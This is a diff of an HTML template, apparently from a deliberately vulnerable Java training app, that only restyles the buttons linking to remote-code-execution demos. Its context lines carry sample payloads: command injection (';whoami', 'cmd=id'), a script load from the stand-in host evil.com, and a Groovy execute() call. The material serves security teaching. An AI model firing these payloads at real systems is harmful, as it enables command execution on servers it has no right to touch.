@@ -61,7 +61,7 @@
 
             <div class="box-float">
                 <div class="float1">
-                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
+                    <a target="_blank" class="btn btn-sm btn-danger run-btn"
                        th:href="@{/vulnapi/RCE/ProcessBuilder/vul?filepath=/tmp;whoami}">
                         <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="currentColor"
                              viewBox="0 0 16 16">
@@ -92,7 +92,7 @@ public static String processbuilderVul(String filepath) throws IOException {
 }
                     </textarea><br><br>
 
-                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
+                    <a target="_blank" class="btn btn-sm btn-danger run-btn"
                        th:href="@{/vulnapi/RCE/Runtime/vul?cmd=id}">
                         <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="currentColor"
                              viewBox="0 0 16 16">
@@ -113,7 +113,7 @@ public static String vul(String cmd) {
      ...
                     </textarea><br><br>
 
-                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
+                    <a target="_blank" class="btn btn-sm btn-danger run-btn"
                        href="/vulnapi/RCE/ProcessImpl/vul?cmd=id">
                         <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="currentColor"
                              viewBox="0 0 16 16">
@@ -141,7 +141,7 @@ public static String vul(String cmd) throws Exception {
                     </textarea><br><br>
 
                     <hr>
-                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
+                    <a target="_blank" class="btn btn-sm btn-danger run-btn"
                        th:href="@{/vulnapi/RCE/ScriptEngine/vul?url=http://evil.com/java/1.js}">
                         <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="currentColor"
                              viewBox="0 0 16 16">
@@ -162,7 +162,7 @@ public void jsEngine(String url) throws Exception {
 }
                     </textarea><br><br>
 
-                    <a style="float:right" class="btn btn-sm btn-danger" target="_blank"
+                    <a target="_blank" class="btn btn-sm btn-danger run-btn"
                        href="/vulnapi/RCE/Groovy/vul?cmd='open -a Calculator'.execute()">
                         <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="currentColor"
                              viewBox="0 0 16 16">
@@ -184,7 +184,7 @@ public void groovy(String cmd) {
                 </div>
 
                 <div class="float2">
-                    <a style="float:right" class="btn btn-sm btn-success" target="_blank"
+                    <a target="_blank" class="btn btn-sm btn-success run-btn"
                        th:href="@{/vulnapi/RCE/ProcessBuilder/safe?filepath=/tmp;whoami}">
                         <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="currentColor"
                              viewBox="0 0 16 16">
@@ -206,7 +206,7 @@ public static boolean checkOs(String content) {
 }
                     </textarea><br><br>
 
-                    <a style="float:right" class="btn btn-sm btn-success" target="_blank"
+                    <a target="_blank" class="btn btn-sm btn-success run-btn"
                        th:href="@{/vulnapi/RCE/Runtime/safe?cmd=whoami}">
                         <svg xmlns="http://www.w3.org/2000/svg" width="13" height="13" fill="currentColor"
                              viewBox="0 0 16 16">
